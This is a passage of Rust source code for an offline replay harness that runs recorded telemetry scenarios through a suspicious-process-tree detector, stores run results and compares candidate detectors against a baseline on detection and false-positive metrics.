use crate::config::{RuntimeConfigError, load_config};
use crate::correlation::{CorrelationEngine, CorrelationError, CorrelationOutcome};
use crate::investigation::{InvestigationStrategy, SummaryInvestigator};
use crate::service::{EventExecutionContext, RuntimeMetricsSnapshot, RuntimeService, ServiceError};
use crate::{RuntimeMode, SwarmRuntime};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, RwLock};
use std::time::{SystemTime, UNIX_EPOCH};
use swarm_core::config::{CorrelationConfig, SwarmConfig};
use swarm_core::types::{AgentId, ResponseAction};
use swarm_pheromone::InMemoryPheromoneSubstrate;
use swarm_policy::static_gate::StaticApprovalGate;
use swarm_policy::{ApprovalContext, PolicyVerdict};
use swarm_response::adapters::SandboxExecutor;
use swarm_spine::{
    CorrelatedIncident, InvestigationBundle, InvestigationBundleStore, InvestigationStatus,
    InvestigationStoreError, MemoryIncidentStore, MemoryInvestigationBundleStore, ReplayBundle,
};
use swarm_whisker::{
    DetectionFinding, DetectionStrategy, SuspiciousProcessTreeDetector,
    SuspiciousProcessTreeProfile, TelemetryEvent,
};

/// Errors surfaced by offline replay and evaluation flows.
#[derive(Debug, thiserror::Error)]
pub enum ReplayHarnessError {
    #[error(transparent)]
    Config(#[from] RuntimeConfigError),

    #[error(transparent)]
    Service(#[from] ServiceError),

    #[error(transparent)]
    Correlation(#[from] CorrelationError),

    #[error(transparent)]
    InvestigationStore(#[from] InvestigationStoreError),

    #[error(transparent)]
    Store(#[from] ReplayRunStoreError),

    #[error(transparent)]
    ExperimentStore(#[from] ExperimentStoreError),

    #[error("failed to read replay scenario `{path}`: {source}")]
    ScenarioRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay scenario `{path}`: {source}")]
    ScenarioParse {
        path: PathBuf,
        #[source]
        source: serde_yaml::Error,
    },

    #[error("invalid replay scenario `{path}`: {reason}")]
    ScenarioValidation { path: PathBuf, reason: String },

    #[error("failed to read replay suite `{path}`: {source}")]
    SuiteRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay suite `{path}`: {source}")]
    SuiteParse {
        path: PathBuf,
        #[source]
        source: serde_yaml::Error,
    },

    #[error("invalid replay suite `{path}`: {reason}")]
    SuiteValidation { path: PathBuf, reason: String },

    #[error("failed to read detector experiment `{path}`: {source}")]
    ExperimentRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse detector experiment `{path}`: {source}")]
    ExperimentParse {
        path: PathBuf,
        #[source]
        source: serde_yaml::Error,
    },

    #[error("invalid detector experiment `{path}`: {reason}")]
    ExperimentValidation { path: PathBuf, reason: String },

    #[error("failed to read replay bundle fixture `{path}`: {source}")]
    BundleRead {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay bundle fixture `{path}`: {source}")]
    BundleParse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },

    #[error("unsupported detector strategy `{strategy}`")]
    UnsupportedDetector { strategy: String },
}

#[derive(Debug, Clone)]
enum SupportedDetector {
    SuspiciousProcessTree {
        strategy_id: String,
        detector: SuspiciousProcessTreeDetector,
    },
}

impl DetectionStrategy for SupportedDetector {
    fn id(&self) -> &str {
        match self {
            Self::SuspiciousProcessTree { strategy_id, .. } => strategy_id.as_str(),
        }
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<DetectionFinding> {
        match self {
            Self::SuspiciousProcessTree {
                strategy_id,
                detector,
            } => detector
                .evaluate(event)
                .into_iter()
                .map(|mut finding| {
                    finding.strategy_id = strategy_id.clone();
                    finding.finding_id = format!("{strategy_id}:{}", finding.event_id);
                    finding
                })
                .collect(),
        }
    }
}

impl SupportedDetector {
    fn suspicious_process_tree(
        strategy_id: impl Into<String>,
        profile: SuspiciousProcessTreeProfile,
    ) -> Self {
        Self::SuspiciousProcessTree {
            strategy_id: strategy_id.into(),
            detector: SuspiciousProcessTreeDetector::from_profile(profile),
        }
    }
}

/// Whether one replay scenario represents adversarial coverage or benign control traffic.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReplayScenarioClass {
    Benign,
    Adversarial,
    #[default]
    Mixed,
}

/// Repo-owned metadata attached to one tracked replay scenario.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayScenarioMetadata {
    #[serde(default)]
    pub class: ReplayScenarioClass,
    #[serde(default)]
    pub campaign: Option<String>,
    #[serde(default)]
    pub techniques: Vec<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Repo-owned metadata attached to a named replay suite.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplaySuiteMetadata {
    #[serde(default)]
    pub campaign: Option<String>,
    #[serde(default)]
    pub techniques: Vec<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Repo-owned replay scenario manifest.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayScenarioManifest {
    pub name: String,
    pub description: String,
    pub seed_time_ms: i64,
    pub requested_by: String,
    #[serde(default)]
    pub receipt_chain: Vec<String>,
    #[serde(default)]
    pub metadata: ReplayScenarioMetadata,
    pub input: ReplayScenarioInput,
    #[serde(default)]
    pub expectations: ReplayExpectations,
}

/// Repo-owned manifest describing a named replay suite.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplaySuiteManifest {
    pub name: String,
    pub description: String,
    pub corpus_version: String,
    #[serde(default)]
    pub metadata: ReplaySuiteMetadata,
    pub scenarios: Vec<String>,
}

/// Replay input source for one scenario.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ReplayScenarioInput {
    Events { events: Vec<ReplayScenarioStep> },
    ReplayBundles { paths: Vec<String> },
}

impl ReplayScenarioInput {
    fn kind(&self) -> ReplayInputKind {
        match self {
            Self::Events { .. } => ReplayInputKind::Events,
            Self::ReplayBundles { .. } => ReplayInputKind::ReplayBundles,
        }
    }
}

/// One replay step driven by a normalized telemetry event and requested response action.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayScenarioStep {
    pub action: ResponseAction,
    pub event: TelemetryEvent,
}

/// Expected outcomes for a replay scenario.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReplayExpectations {
    #[serde(default)]
    pub replay_bundle_count: Option<usize>,
    #[serde(default)]
    pub investigation_count: Option<usize>,
    #[serde(default)]
    pub incident_count: Option<usize>,
    #[serde(default)]
    pub hunts: Vec<ExpectedHuntOutcome>,
    #[serde(default)]
    pub incident_hunt_groups: Vec<Vec<String>>,
    #[serde(default)]
    pub max_detect_latency_us: Option<u64>,
    #[serde(default)]
    pub max_policy_latency_us: Option<u64>,
    #[serde(default)]
    pub max_response_latency_us: Option<u64>,
}

/// Expected outcome for one replay hunt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExpectedHuntOutcome {
    pub hunt_id: String,
    pub action_kind: String,
    pub policy_verdict: PolicyVerdict,
    pub response_kind: String,
}

/// Replay input type recorded in the durable result bundle.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReplayInputKind {
    Events,
    ReplayBundles,
}

/// Stable actual hunt outcome captured from one replay run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ActualHuntOutcome {
    pub hunt_id: String,
    pub action_kind: String,
    pub policy_verdict: PolicyVerdict,
    pub response_kind: String,
}

/// Deterministic replay summary used for repeatability checks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayDeterministicSummary {
    pub replay_bundle_count: usize,
    pub investigation_count: usize,
    pub incident_count: usize,
    pub hunts: Vec<ActualHuntOutcome>,
    pub incident_hunt_groups: Vec<Vec<String>>,
}

impl ReplayDeterministicSummary {
    fn from_outputs(
        replay_bundles: &[ReplayBundle],
        investigations: &[InvestigationBundle],
        incidents: &[CorrelatedIncident],
    ) -> Self {
        let mut hunts = replay_bundles
            .iter()
            .map(|bundle| ActualHuntOutcome {
                hunt_id: bundle.audit.hunt_id.clone(),
                action_kind: bundle.action_kind().to_string(),
                policy_verdict: bundle.audit.policy.verdict,
                response_kind: bundle.audit.response_kind().to_string(),
            })
            .collect::<Vec<_>>();
        hunts.sort_by(|left, right| left.hunt_id.cmp(&right.hunt_id));

        let mut incident_hunt_groups = incidents
            .iter()
            .map(|incident| {
                let mut hunt_ids = incident.included_hunt_ids();
                hunt_ids.sort();
                hunt_ids.dedup();
                hunt_ids
            })
            .collect::<Vec<_>>();
        incident_hunt_groups.sort();

        Self {
            replay_bundle_count: replay_bundles.len(),
            investigation_count: investigations.len(),
            incident_count: incidents.len(),
            hunts,
            incident_hunt_groups,
        }
    }
}

/// Durable replay result bundle written by the offline harness.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayRunBundle {
    pub run_id: String,
    pub scenario_name: String,
    pub scenario_path: String,
    pub description: String,
    pub metadata: ReplayScenarioMetadata,
    pub input_kind: ReplayInputKind,
    pub seed_time_ms: i64,
    pub created_at_ms: i64,
    pub requested_by: String,
    pub expectations: ReplayExpectations,
    pub replay_bundles: Vec<ReplayBundle>,
    pub investigations: Vec<InvestigationBundle>,
    pub incidents: Vec<CorrelatedIncident>,
    pub deterministic_summary: ReplayDeterministicSummary,
    pub performance: RuntimeMetricsSnapshot,
}

/// Metadata surfaced for one persisted replay run.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayRunRecord {
    pub run_id: String,
    pub scenario_name: String,
    pub input_kind: ReplayInputKind,
    pub created_at_ms: i64,
    pub replay_bundle_count: usize,
    pub investigation_count: usize,
    pub incident_count: usize,
    pub bundle_path: String,
}

impl ReplayRunRecord {
    fn from_bundle(bundle: &ReplayRunBundle, bundle_path: String) -> Self {
        Self {
            run_id: bundle.run_id.clone(),
            scenario_name: bundle.scenario_name.clone(),
            input_kind: bundle.input_kind,
            created_at_ms: bundle.created_at_ms,
            replay_bundle_count: bundle.deterministic_summary.replay_bundle_count,
            investigation_count: bundle.deterministic_summary.investigation_count,
            incident_count: bundle.deterministic_summary.incident_count,
            bundle_path,
        }
    }
}

/// Persisted replay run loaded with metadata.
#[derive(Debug, Clone)]
pub struct ReplayRunLookup {
    pub record: ReplayRunRecord,
    pub bundle: ReplayRunBundle,
}

/// Health summary for the replay run store.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayRunStoreHealth {
    pub backend: String,
    pub durable: bool,
    pub ready: bool,
    pub stored_runs: usize,
    pub details: String,
}

/// Replay run store errors.
#[derive(Debug, thiserror::Error)]
pub enum ReplayRunStoreError {
    #[error("replay run store lock poisoned")]
    PoisonedLock,

    #[error("failed to read replay run store file `{path}`: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to write replay run store file `{path}`: {source}")]
    Write {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse replay run store file `{path}`: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
}

/// Store contract for durable replay runs.
pub trait ReplayRunStore: Send + Sync {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError>;
    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError>;
    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError>;
    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError>;
}

/// In-memory replay run store used by tests.
#[derive(Debug, Clone, Default)]
pub struct MemoryReplayRunStore {
    bundles: Arc<RwLock<Vec<ReplayRunBundle>>>,
}

impl ReplayRunStore for MemoryReplayRunStore {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError> {
        let mut guard = self
            .bundles
            .write()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        guard.retain(|existing| existing.run_id != bundle.run_id);
        guard.push(bundle.clone());
        Ok(ReplayRunRecord::from_bundle(bundle, "memory".to_string()))
    }

    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        Ok(guard
            .iter()
            .find(|bundle| bundle.run_id == run_id)
            .cloned()
            .map(|bundle| ReplayRunLookup {
                record: ReplayRunRecord::from_bundle(&bundle, "memory".to_string()),
                bundle,
            }))
    }

    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        let mut entries = sorted_recent_runs(&guard)
            .into_iter()
            .map(|bundle| ReplayRunRecord::from_bundle(&bundle, "memory".to_string()))
            .collect::<Vec<_>>();
        entries.truncate(limit);
        Ok(entries)
    }

    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError> {
        let guard = self
            .bundles
            .read()
            .map_err(|_| ReplayRunStoreError::PoisonedLock)?;
        Ok(ReplayRunStoreHealth {
            backend: "memory".to_string(),
            durable: false,
            ready: true,
            stored_runs: guard.len(),
            details: "ephemeral in-process replay run store".to_string(),
        })
    }
}

/// File-backed replay run store used by the operator CLI and CI flows.
#[derive(Debug, Clone)]
pub struct FileReplayRunStore {
    root: PathBuf,
}

impl FileReplayRunStore {
    pub fn open(path: impl AsRef<Path>) -> Result<Self, ReplayRunStoreError> {
        let root = path.as_ref().to_path_buf();
        fs::create_dir_all(root.join("runs")).map_err(|source| ReplayRunStoreError::Write {
            path: root.clone(),
            source,
        })?;
        Ok(Self { root })
    }

    fn run_path(&self, run_id: &str) -> PathBuf {
        self.root
            .join("runs")
            .join(format!("{}.json", sanitize_id(run_id)))
    }

    fn index_path(&self) -> PathBuf {
        self.root.join("index.json")
    }

    fn read_index(&self) -> Result<ReplayRunIndex, ReplayRunStoreError> {
        let path = self.index_path();
        if !path.exists() {
            return Ok(ReplayRunIndex::default());
        }
        let raw = fs::read_to_string(&path).map_err(|source| ReplayRunStoreError::Read {
            path: path.clone(),
            source,
        })?;
        serde_json::from_str(&raw).map_err(|source| ReplayRunStoreError::Parse { path, source })
    }

    fn write_index(&self, index: &ReplayRunIndex) -> Result<(), ReplayRunStoreError> {
        let path = self.index_path();
        let raw =
            serde_json::to_string_pretty(index).map_err(|source| ReplayRunStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ReplayRunStoreError::Write { path, source })
    }
}

impl ReplayRunStore for FileReplayRunStore {
    fn persist(&self, bundle: &ReplayRunBundle) -> Result<ReplayRunRecord, ReplayRunStoreError> {
        let path = self.run_path(&bundle.run_id);
        let raw =
            serde_json::to_string_pretty(bundle).map_err(|source| ReplayRunStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ReplayRunStoreError::Write {
            path: path.clone(),
            source,
        })?;

        let mut index = self.read_index()?;
        let record = ReplayRunRecord::from_bundle(bundle, path.display().to_string());
        index.entries.retain(|entry| entry.run_id != record.run_id);
        index.entries.push(record.clone());
        index
            .entries
            .sort_by_key(|entry| std::cmp::Reverse(entry.created_at_ms));
        self.write_index(&index)?;
        Ok(record)
    }

    fn load_by_run_id(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayRunStoreError> {
        let index = self.read_index()?;
        let Some(record) = index
            .entries
            .iter()
            .find(|entry| entry.run_id == run_id)
            .cloned()
        else {
            return Ok(None);
        };
        let path = PathBuf::from(&record.bundle_path);
        let raw = fs::read_to_string(&path).map_err(|source| ReplayRunStoreError::Read {
            path: path.clone(),
            source,
        })?;
        let bundle = serde_json::from_str(&raw).map_err(|source| ReplayRunStoreError::Parse {
            path: path.clone(),
            source,
        })?;
        Ok(Some(ReplayRunLookup { record, bundle }))
    }

    fn recent(&self, limit: usize) -> Result<Vec<ReplayRunRecord>, ReplayRunStoreError> {
        let mut entries = self.read_index()?.entries;
        entries.truncate(limit);
        Ok(entries)
    }

    fn health(&self) -> Result<ReplayRunStoreHealth, ReplayRunStoreError> {
        let entries = self.read_index()?.entries;
        Ok(ReplayRunStoreHealth {
            backend: "local_files".to_string(),
            durable: true,
            ready: true,
            stored_runs: entries.len(),
            details: format!("replay run bundles persisted under {}", self.root.display()),
        })
    }
}

/// One replay evaluation check.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayEvaluationCheck {
    pub name: String,
    pub passed: bool,
    pub expected: serde_json::Value,
    pub actual: serde_json::Value,
    pub details: String,
}

/// Full evaluation report for one replay run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayEvaluationReport {
    pub run_id: String,
    pub scenario_name: String,
    pub scenario_path: String,
    pub metadata: ReplayScenarioMetadata,
    pub passed: bool,
    pub checks: Vec<ReplayEvaluationCheck>,
    pub deterministic_summary: ReplayDeterministicSummary,
    pub performance: RuntimeMetricsSnapshot,
}

/// How a replay suite was selected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReplaySuiteSourceKind {
    ScenariosDir,
    SuiteManifest,
}

/// Per-technique status for one evaluated replay suite.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayTechniqueGroupReport {
    pub technique: String,
    pub total_scenarios: usize,
    pub failing_scenarios: Vec<String>,
}

/// Per-scenario result within one evaluated replay suite.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplaySuiteScenarioReport {
    pub scenario_name: String,
    pub scenario_path: String,
    pub metadata: ReplayScenarioMetadata,
    pub evaluation: ReplayEvaluationReport,
}

/// Suite-level replay evaluation report across a tracked scenario directory or named manifest.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplaySuiteReport {
    pub source: String,
    pub source_kind: ReplaySuiteSourceKind,
    pub suite_name: Option<String>,
    pub suite_description: Option<String>,
    pub corpus_version: Option<String>,
    pub total_scenarios: usize,
    pub passed_scenarios: usize,
    pub failed_scenarios: usize,
    pub passed: bool,
    pub scenario_reports: Vec<ReplaySuiteScenarioReport>,
    pub technique_groups: Vec<ReplayTechniqueGroupReport>,
}

/// Repo-owned target corpus for one detector experiment.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExperimentCorpusTarget {
    pub suite: String,
}

/// Repo-owned lineage metadata for one detector experiment.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExperimentLineage {
    pub parent_strategy_id: String,
    pub mutation: String,
    pub rationale: String,
}

/// Offline safety thresholds for one detector experiment.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExperimentGateConfig {
    #[serde(default = "default_require_known_bad_coverage")]
    pub require_known_bad_coverage: bool,
    #[serde(default)]
    pub max_false_positive_delta: i64,
    #[serde(default = "default_max_detect_latency_delta_us")]
    pub max_detect_latency_delta_us: u64,
}

impl Default for ExperimentGateConfig {
    fn default() -> Self {
        Self {
            require_known_bad_coverage: default_require_known_bad_coverage(),
            max_false_positive_delta: 0,
            max_detect_latency_delta_us: default_max_detect_latency_delta_us(),
        }
    }
}

/// Candidate detector description loaded from a repo-owned manifest.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "strategy", rename_all = "snake_case")]
pub enum DetectorCandidateManifest {
    SuspiciousProcessTree {
        strategy_id: String,
        description: String,
        profile: SuspiciousProcessTreeProfile,
    },
}

impl DetectorCandidateManifest {
    fn strategy_id(&self) -> &str {
        match self {
            Self::SuspiciousProcessTree { strategy_id, .. } => strategy_id.as_str(),
        }
    }

    fn description(&self) -> &str {
        match self {
            Self::SuspiciousProcessTree { description, .. } => description.as_str(),
        }
    }
}

/// Repo-owned experiment manifest that compares production and candidate detectors offline.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct DetectorExperimentManifest {
    pub name: String,
    pub description: String,
    pub corpus: ExperimentCorpusTarget,
    pub candidate: DetectorCandidateManifest,
    pub lineage: ExperimentLineage,
    #[serde(default)]
    pub gates: ExperimentGateConfig,
}

/// Scenario-level regression surfaced by a detector comparison.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StrategyScenarioRegression {
    pub scenario_name: String,
    pub scenario_path: String,
    pub class: ReplayScenarioClass,
    pub techniques: Vec<String>,
    pub reason: String,
}

/// Technique-level regression summary surfaced by a detector comparison.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StrategyTechniqueRegression {
    pub technique: String,
    pub scenarios: Vec<String>,
}

/// Aggregate detector metrics over one replay suite.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct StrategyExperimentMetrics {
    pub total_scenarios: usize,
    pub adversarial_scenarios: usize,
    pub benign_scenarios: usize,
    pub true_positive_scenarios: usize,
    pub false_negative_scenarios: usize,
    pub true_negative_scenarios: usize,
    pub false_positive_scenarios: usize,
    pub detection_rate: f64,
    pub false_positive_rate: f64,
    pub max_detect_latency_us: u64,
}

/// Delta between baseline and candidate detector metrics.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct StrategyExperimentMetricDelta {
    pub detection_rate_delta: f64,
    pub false_positive_rate_delta: f64,
    pub max_detect_latency_delta_us: i64,
    pub false_positive_scenario_delta: i64,
}

/// Comparison summary across baseline and candidate replay suites.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StrategyExperimentComparison {
    pub baseline: StrategyExperimentMetrics,
    pub candidate: StrategyExperimentMetrics,
    pub delta: StrategyExperimentMetricDelta,
    pub scenario_regressions: Vec<StrategyScenarioRegression>,
    pub technique_regressions: Vec<StrategyTechniqueRegression>,
}

/// One offline safety gate verdict for a detector experiment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExperimentGateResult {
    pub name: String,
    pub passed: bool,
    pub expected: serde_json::Value,
    pub actual: serde_json::Value,
    pub details: String,
}

/// Persisted detector experiment report.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StrategyExperimentReport {
    pub experiment_id: String,
    pub experiment_name: String,
    pub description: String,
    pub created_at_ms: i64,
    pub suite_name: String,
    pub suite_path: String,
    pub corpus_version: String,
    pub lineage: ExperimentLineage,
    pub baseline_strategy_id: String,
    pub candidate_strategy_id: String,
    pub candidate_description: String,
    pub baseline_report: ReplaySuiteReport,
    pub candidate_report: ReplaySuiteReport,
    pub comparison: StrategyExperimentComparison,
    pub gates: Vec<ExperimentGateResult>,
    pub passed: bool,
}

/// Metadata surfaced for one persisted detector experiment.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StrategyExperimentRecord {
    pub experiment_id: String,
    pub experiment_name: String,
    pub suite_name: String,
    pub corpus_version: String,
    pub created_at_ms: i64,
    pub passed: bool,
    pub bundle_path: String,
}

impl StrategyExperimentRecord {
    fn from_report(report: &StrategyExperimentReport, bundle_path: String) -> Self {
        Self {
            experiment_id: report.experiment_id.clone(),
            experiment_name: report.experiment_name.clone(),
            suite_name: report.suite_name.clone(),
            corpus_version: report.corpus_version.clone(),
            created_at_ms: report.created_at_ms,
            passed: report.passed,
            bundle_path,
        }
    }
}

/// Persisted detector experiment loaded with metadata.
#[derive(Debug, Clone)]
pub struct StrategyExperimentLookup {
    pub record: StrategyExperimentRecord,
    pub report: StrategyExperimentReport,
}

/// Detector experiment store errors.
#[derive(Debug, thiserror::Error)]
pub enum ExperimentStoreError {
    #[error("failed to read experiment store file `{path}`: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to write experiment store file `{path}`: {source}")]
    Write {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },

    #[error("failed to parse experiment store file `{path}`: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
}

/// File-backed experiment store used for offline detector reports.
#[derive(Debug, Clone)]
pub struct FileExperimentStore {
    root: PathBuf,
}

impl FileExperimentStore {
    pub fn open(path: impl AsRef<Path>) -> Result<Self, ExperimentStoreError> {
        let root = path.as_ref().to_path_buf();
        fs::create_dir_all(root.join("reports")).map_err(|source| ExperimentStoreError::Write {
            path: root.clone(),
            source,
        })?;
        Ok(Self { root })
    }

    fn report_path(&self, experiment_id: &str) -> PathBuf {
        self.root
            .join("reports")
            .join(format!("{}.json", sanitize_id(experiment_id)))
    }

    fn index_path(&self) -> PathBuf {
        self.root.join("index.json")
    }

    fn read_index(&self) -> Result<ExperimentIndex, ExperimentStoreError> {
        let path = self.index_path();
        if !path.exists() {
            return Ok(ExperimentIndex::default());
        }
        let raw = fs::read_to_string(&path).map_err(|source| ExperimentStoreError::Read {
            path: path.clone(),
            source,
        })?;
        serde_json::from_str(&raw).map_err(|source| ExperimentStoreError::Parse { path, source })
    }

    fn write_index(&self, index: &ExperimentIndex) -> Result<(), ExperimentStoreError> {
        let path = self.index_path();
        let raw =
            serde_json::to_string_pretty(index).map_err(|source| ExperimentStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ExperimentStoreError::Write { path, source })
    }

    pub fn persist(
        &self,
        report: &StrategyExperimentReport,
    ) -> Result<StrategyExperimentRecord, ExperimentStoreError> {
        let path = self.report_path(&report.experiment_id);
        let raw =
            serde_json::to_string_pretty(report).map_err(|source| ExperimentStoreError::Parse {
                path: path.clone(),
                source,
            })?;
        fs::write(&path, raw).map_err(|source| ExperimentStoreError::Write {
            path: path.clone(),
            source,
        })?;

        let mut index = self.read_index()?;
        let record = StrategyExperimentRecord::from_report(report, path.display().to_string());
        index
            .entries
            .retain(|entry| entry.experiment_id != record.experiment_id);
        index.entries.push(record.clone());
        index
            .entries
            .sort_by_key(|entry| std::cmp::Reverse(entry.created_at_ms));
        self.write_index(&index)?;
        Ok(record)
    }

    pub fn load(
        &self,
        experiment_id: &str,
    ) -> Result<Option<StrategyExperimentLookup>, ExperimentStoreError> {
        let index = self.read_index()?;
        let Some(record) = index
            .entries
            .iter()
            .find(|entry| entry.experiment_id == experiment_id)
            .cloned()
        else {
            return Ok(None);
        };
        let path = PathBuf::from(&record.bundle_path);
        let raw = fs::read_to_string(&path).map_err(|source| ExperimentStoreError::Read {
            path: path.clone(),
            source,
        })?;
        let report = serde_json::from_str(&raw).map_err(|source| ExperimentStoreError::Parse {
            path: path.clone(),
            source,
        })?;
        Ok(Some(StrategyExperimentLookup { record, report }))
    }
}

/// Offline replay harness that reuses the production Rust types without executing live actions.
pub struct DefaultReplayHarness {
    pub config_path: PathBuf,
    pub config: SwarmConfig,
    pub results_dir: PathBuf,
    detector: SupportedDetector,
    result_store: FileReplayRunStore,
}

impl DefaultReplayHarness {
    /// Build the harness from repository config plus a durable replay-results directory.
    pub fn from_path(
        config_path: impl AsRef<Path>,
        results_dir: impl AsRef<Path>,
    ) -> Result<Self, ReplayHarnessError> {
        let config_path = config_path.as_ref();
        let config = load_config(config_path)?;
        Self::from_config(config_path, config, results_dir)
    }

    /// Build the harness from an already-validated config.
    pub fn from_config(
        config_path: impl Into<PathBuf>,
        config: SwarmConfig,
        results_dir: impl AsRef<Path>,
    ) -> Result<Self, ReplayHarnessError> {
        let detector = supported_detector(&config)?;
        let result_store = FileReplayRunStore::open(results_dir.as_ref())?;
        Ok(Self {
            config_path: config_path.into(),
            config,
            results_dir: results_dir.as_ref().to_path_buf(),
            detector,
            result_store,
        })
    }

    /// Execute one scenario manifest, persist the result bundle, and return the durable lookup.
    pub async fn run_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<ReplayRunLookup, ReplayHarnessError> {
        let loaded = load_scenario_manifest(scenario_path)?;
        let run_bundle = self.run_loaded_scenario(&self.detector, &loaded).await?;
        let record = self.result_store.persist(&run_bundle)?;

        Ok(ReplayRunLookup {
            record,
            bundle: run_bundle,
        })
    }

    /// Load a persisted replay run by its stable run id.
    pub fn load_run(&self, run_id: &str) -> Result<Option<ReplayRunLookup>, ReplayHarnessError> {
        Ok(self.result_store.load_by_run_id(run_id)?)
    }

    /// Load a persisted replay run using the stable run id derived from a scenario manifest.
    pub fn load_run_for_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<Option<ReplayRunLookup>, ReplayHarnessError> {
        let loaded = load_scenario_manifest(scenario_path)?;
        self.load_run(&run_id_for_manifest(&loaded.manifest))
    }

    /// Execute one scenario and immediately evaluate the result bundle.
    pub async fn evaluate_scenario_path(
        &self,
        scenario_path: impl AsRef<Path>,
    ) -> Result<ReplayEvaluationReport, ReplayHarnessError> {
        let lookup = self.run_scenario_path(scenario_path).await?;
        Ok(self.evaluate_run(&lookup.bundle))
    }

    /// Evaluate every tracked scenario in one directory and aggregate the results.
    pub async fn evaluate_scenarios_dir(
        &self,
        scenarios_dir: impl AsRef<Path>,
    ) -> Result<ReplaySuiteReport, ReplayHarnessError> {
        let scenarios_dir = scenarios_dir.as_ref().to_path_buf();
        let scenario_paths = scenario_paths_in_dir(&scenarios_dir)?;
        if scenario_paths.is_empty() {
